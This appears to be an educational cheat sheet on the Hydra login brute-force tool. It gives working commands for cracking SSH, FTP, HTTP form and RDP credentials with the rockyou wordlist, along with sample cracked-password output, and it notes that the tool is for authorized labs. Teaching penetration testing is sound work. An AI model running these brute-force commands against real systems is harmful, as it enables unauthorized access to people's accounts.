
# Hydra

## What is Hydra

- **Hydra** is a powerful **password cracking tool** used for performing **brute-force attacks on login services**
- It is commonly used by:
  - penetration testers
  - ethical hackers
  - bug bounty hunters
  - CTF players
- Hydra works by **trying many username and password combinations automatically**

Hydra supports many protocols such as:

- SSH
- FTP
- HTTP
- HTTPS
- SMB
- RDP
- Telnet
- MySQL
- PostgreSQL
- VNC
- LDAP

Because of its speed and flexibility, Hydra is one of the **most widely used login brute-force tools in cybersecurity testing**.

---

## Install Hydra

Hydra is usually pre-installed in **Kali Linux**.

To verify installation:

```
hydra -h
```

If Hydra is not installed, install it using:

```
sudo apt install hydra
```

---

## Basic Syntax

Basic Hydra command format:

```
hydra -l <username> -P <password_list> <target> <service>
```

Explanation:

| Option | Meaning |
|------|------|
| -l | single username |
| -L | username list |
| -p | single password |
| -P | password list |
| target | IP or domain |
| service | login service |

Example format:

```
hydra -l admin -P rockyou.txt 192.168.1.10 ssh
```

---

## SSH Example

Hydra can brute-force **SSH login credentials**.

```
hydra -l admin -P rockyou.txt ssh://<target>
```

Example:

```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
```

Example output:

```
[22][ssh] host: 192.168.1.10 login: root password: password123
```

---

## FTP Example

Hydra can brute-force **FTP login servers**.

```
hydra -l admin -P rockyou.txt ftp://<target>
```

Example:

```
hydra -l ftpuser -P rockyou.txt ftp://192.168.1.15
```

---

## HTTP Login Example

Hydra can attack **web login forms**.

```
hydra -l admin -P rockyou.txt <target> http-post-form
```

Example:

```
hydra -l admin -P rockyou.txt 192.168.1.20 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

---

## RDP Example

Hydra can brute-force **Remote Desktop Protocol (RDP)** logins.

```
hydra -l admin -P rockyou.txt rdp://<target>
```

Example:

```
hydra -l administrator -P rockyou.txt rdp://192.168.1.50
```

---

## Use Username List

If you have **multiple usernames**, use the `-L` option.

```
hydra -L users.txt -P rockyou.txt ssh://<target>
```

---

## Use Password List

To use a **custom password list**:

```
hydra -l admin -P passwords.txt ssh://<target>
```

Common password lists:

```
/usr/share/wordlists/rockyou.txt
```

---

## Stop After First Found

To stop Hydra once a valid credential is found:

```
hydra -f -l admin -P rockyou.txt ssh://<target>
```

---

## Verbose Output

To display detailed output:

```
hydra -V -l admin -P rockyou.txt ssh://<target>
```

---

## Specify Port

If the service runs on a **custom port**, use `-s`.

```
hydra -l admin -P rockyou.txt -s 22 <target> ssh
```

Example:

```
hydra -l admin -P rockyou.txt -s 2222 192.168.1.10 ssh
```

---

## Useful Hydra Options

| Option | Purpose |
|------|------|
| -l | single username |
| -L | username list |
| -p | single password |
| -P | password list |
| -V | verbose output |
| -f | stop after first success |
| -t | number of parallel tasks |
| -s | specify port |
| -o | save output |

Example:

```
hydra -l admin -P rockyou.txt -V -o result.txt ssh://192.168.1.10
```

---

## Simple Flow

Typical Hydra workflow during penetration testing:

### Step 1 — Identify Service

Use **Nmap** to find open services.

```
nmap -p 22 192.168.1.10
```

### Step 2 — Choose Wordlist

```
/usr/share/wordlists/rockyou.txt
```

### Step 3 — Run Hydra

```
hydra -l root -P rockyou.txt ssh://192.168.1.10
```

### Step 4 — Capture Credentials

```
login: root password: secret123
```

---

## Use Cases

- brute-force login testing
- testing weak passwords
- verifying authentication security
- CTF challenges
- penetration testing

---

## Best Practice

Hydra should only be used in **authorized environments**.

Safe practice platforms:

- TryHackMe
- Hack The Box
- PortSwigger Labs
- OWASP Juice Shop
- CTF platforms

---

## Summary

Hydra is a **powerful and fast login brute-force tool** used in penetration testing and cybersecurity research.

It helps testers:

- discover weak passwords
- test authentication security
- audit login systems
- practice real-world attack techniques

<div style="background: #1f3327; border-radius: 8px; padding: 18px; margin: 20px 0; border-left: 5px solid #3ddc84; color: #e6e6e6;">
<strong>✔ Learning Tip</strong><br><br>
Practice troubleshooting. If something breaks, investigate the cause instead of immediately searching for the answer.
</div>